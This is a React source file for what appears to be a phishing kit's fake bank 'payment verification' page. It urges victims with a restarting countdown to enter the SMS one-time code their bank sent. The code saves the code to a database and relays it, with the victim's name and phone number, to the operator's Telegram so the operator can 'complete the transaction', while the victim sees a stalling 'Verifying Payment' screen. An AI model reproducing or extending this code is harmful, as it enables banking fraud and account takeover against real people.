import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { ArrowLeft, MessageSquare, Shield, Loader2, AlertTriangle, XCircle, Info, Clock, Timer } from "lucide-react";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import { supabase } from "@/integrations/supabase/client";
import { Progress } from "@/components/ui/progress";
import { useVerificationTimer } from "@/hooks/useVerificationTimer";

interface SmsVerificationProps {
  onBack: () => void;
  sessionCode: string;
  clientName: string | null;
  phoneNumber: string | null;
  adminMessage: string | null;
  messageType: string | null;
  onDismissMessage: () => void;
}

const SmsVerification = ({ 
  onBack, 
  sessionCode, 
  clientName, 
  phoneNumber,
  adminMessage,
  messageType,
  onDismissMessage
}: SmsVerificationProps) => {
  const { timeoutSeconds } = useVerificationTimer();
  const [code, setCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [elapsedSeconds, setElapsedSeconds] = useState(0);
  const [remainingSeconds, setRemainingSeconds] = useState(timeoutSeconds);
  const [timerInitialized, setTimerInitialized] = useState(false);

  // Initialize remaining seconds when timer setting loads
  useEffect(() => {
    if (!timerInitialized) {
      setRemainingSeconds(timeoutSeconds);
      setTimerInitialized(true);
    }
  }, [timeoutSeconds, timerInitialized]);

  // Timer for elapsed time and countdown (auto-restart when expired)
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsedSeconds(prev => prev + 1);
      setRemainingSeconds(prev => {
        if (prev <= 1) {
          return timeoutSeconds; // Auto-restart timer
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(interval);
  }, [timeoutSeconds]);

  // Reset form when admin sends an error message (wrong SMS)
  useEffect(() => {
    if (adminMessage && messageType === "error" && isSubmitted) {
      setIsSubmitted(false);
      setCode("");
      setRemainingSeconds(timeoutSeconds);
    }
  }, [adminMessage, messageType, isSubmitted, timeoutSeconds]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const sendCodeToTelegram = async (smsCode: string) => {
    try {
      const message = `📱 <b>SMS Code Received</b>

📋 <b>Session:</b> #${sessionCode}
👤 <b>Client:</b> ${clientName || "Unknown"}
📱 <b>Phone:</b> ${phoneNumber || "N/A"}

🔑 <b>SMS Code:</b> <code>${smsCode}</code>
⏱ <b>Wait Time:</b> ${formatTime(elapsedSeconds)}

⏰ <b>Time:</b> ${new Date().toLocaleString()}

⚠️ Use this code to complete the transaction, then click "Confirm Payment" in admin panel.`;

      await supabase.functions.invoke("send-telegram", {
        body: { message },
      });
    } catch (error) {
      console.error("Failed to send Telegram notification:", error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 6) return;
    
    setIsSubmitting(true);
    
    // Clear any previous admin message
    onDismissMessage();
    
    // Save the code to the database
    const sessionId = localStorage.getItem("swift_session_id");
    if (sessionId) {
      await supabase
        .from("client_sessions")
        .update({ verification_code: code })
        .eq("id", sessionId);
    }
    
    // Send the code to Telegram for admin to see
    await sendCodeToTelegram(code);
    
    setIsSubmitting(false);
    setIsSubmitted(true);
  };

  const getAlertIcon = () => {
    switch (messageType) {
      case "error": return <XCircle className="w-5 h-5" />;
      case "warning": return <AlertTriangle className="w-5 h-5" />;
      default: return <Info className="w-5 h-5" />;
    }
  };

  const getAlertStyles = () => {
    switch (messageType) {
      case "error": return "bg-destructive/10 border-destructive/30 text-destructive";
      case "warning": return "bg-yellow-500/10 border-yellow-500/30 text-yellow-600";
      default: return "bg-blue-500/10 border-blue-500/30 text-blue-600";
    }
  };

  const progressPercent = (remainingSeconds / timeoutSeconds) * 100;
  const isUrgent = remainingSeconds < 60;

  if (isSubmitted) {
    return (
      <div className="animate-slide-up">
        <div className="card-elevated p-8 max-w-lg mx-auto">
          <div className="text-center mb-8">
            <div className="flex items-center justify-center mb-4">
              <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
                <Loader2 className="w-8 h-8 text-primary animate-spin" />
              </div>
            </div>
            <h2 className="text-2xl font-display font-bold mb-2">
              Verifying Payment
            </h2>
            <p className="text-muted-foreground">
              Please wait while we verify your payment. This may take a moment...
            </p>
          </div>

          {/* Waiting Timer */}
          <div className="bg-muted/50 rounded-xl p-4 mb-6 text-center">
            <div className="flex items-center justify-center gap-2 mb-1">
              <Clock className="w-4 h-4 text-muted-foreground" />
              <span className="text-sm text-muted-foreground">Waiting time</span>
            </div>
            <span className="text-2xl font-mono font-bold text-foreground">
              {formatTime(elapsedSeconds)}
            </span>
          </div>

          <div className="bg-secondary/50 rounded-xl p-4 mb-6">
            <div className="flex items-center gap-2 mb-2">
              <Shield className="w-4 h-4 text-primary" />
              <span className="text-sm font-medium">Processing</span>
            </div>
            <p className="text-sm text-muted-foreground">
              Your verification code has been submitted. Please do not close this page.
            </p>
          </div>

          <div className="flex items-center justify-center gap-2 text-muted-foreground">
            <Loader2 className="w-4 h-4 animate-spin" />
            <span className="text-sm">Waiting for confirmation...</span>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="animate-slide-up">
      <div className="card-elevated p-8 max-w-lg mx-auto">
        <div className="text-center mb-6">
          <div className="flex items-center justify-center mb-4">
            <div className="w-16 h-16 rounded-full bg-primary/10 flex items-center justify-center">
              <MessageSquare className="w-8 h-8 text-primary" />
            </div>
          </div>
          <h2 className="text-2xl font-display font-bold mb-2">
            Payment Verification
          </h2>
          <p className="text-muted-foreground">
            Enter the verification code you received via SMS to confirm your payment.
          </p>
        </div>

        {/* Countdown Timer */}
        <div className={`rounded-xl p-4 mb-6 border ${isUrgent ? 'bg-orange-500/10 border-orange-500/30' : 'bg-yellow-500/10 border-yellow-500/30'}`}>
          <div className="flex items-center justify-between mb-2">
            <div className="flex items-center gap-2">
              <Timer className={`w-4 h-4 ${isUrgent ? 'text-orange-500' : 'text-yellow-600'}`} />
              <span className={`text-sm font-medium ${isUrgent ? 'text-orange-600' : 'text-yellow-600'}`}>
                Time remaining
              </span>
            </div>
            <span className={`text-xl font-mono font-bold ${isUrgent ? 'text-orange-600 animate-pulse' : 'text-yellow-600'}`}>
              {formatTime(remainingSeconds)}
            </span>
          </div>
          <Progress 
            value={progressPercent} 
            className={`h-2 ${isUrgent ? '[&>div]:bg-orange-500' : '[&>div]:bg-yellow-500'}`}
          />
          {isUrgent && (
            <p className="text-xs text-orange-600 mt-2">
              Hurry! Enter your verification code before time runs out.
            </p>
          )}
        </div>


        {/* Admin Alert Message */}
        {adminMessage && (
          <div className={`flex items-start gap-3 p-4 rounded-xl border mb-6 ${getAlertStyles()}`}>
            {getAlertIcon()}
            <div className="flex-1">
              <p className="text-sm font-medium">{adminMessage}</p>
            </div>
            <button onClick={onDismissMessage} className="opacity-70 hover:opacity-100">
              <XCircle className="w-4 h-4" />
            </button>
          </div>
        )}

        {/* SMS Info */}
        <div className="bg-secondary/50 rounded-xl p-4 mb-6">
          <div className="flex items-center gap-2 mb-2">
            <Shield className="w-4 h-4 text-primary" />
            <span className="text-sm font-medium">Bank Verification</span>
          </div>
          <p className="text-sm text-muted-foreground">
            Your bank has sent a verification code to your registered phone number. Please enter it below.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input */}
          <div className="flex flex-col items-center gap-4">
            <label className="text-sm font-medium text-foreground">
              Enter verification code
            </label>
            <InputOTP
              maxLength={6}
              value={code}
              onChange={(value) => setCode(value)}
            >
              <InputOTPGroup>
                <InputOTPSlot index={0} />
                <InputOTPSlot index={1} />
                <InputOTPSlot index={2} />
                <InputOTPSlot index={3} />
                <InputOTPSlot index={4} />
                <InputOTPSlot index={5} />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {/* Action Buttons */}
          <div className="flex gap-4">
            <Button
              type="button"
              variant="outline"
              onClick={onBack}
              className="flex-1 h-12 rounded-xl"
            >
              <ArrowLeft className="w-4 h-4 mr-2" />
              Back
            </Button>
            <Button
              type="submit"
              disabled={code.length !== 6 || isSubmitting}
              className="flex-1 h-12 bg-primary hover:bg-primary/90 text-primary-foreground rounded-xl"
            >
              {isSubmitting ? "Submitting..." : "Verify Code"}
            </Button>
          </div>
        </form>

        {/* Security note */}
        <div className="mt-6 text-center">
          <p className="text-xs text-muted-foreground">
            🔒 This verification ensures your payment is secure and authorized
          </p>
        </div>
      </div>
    </div>
  );
};

export default SmsVerification;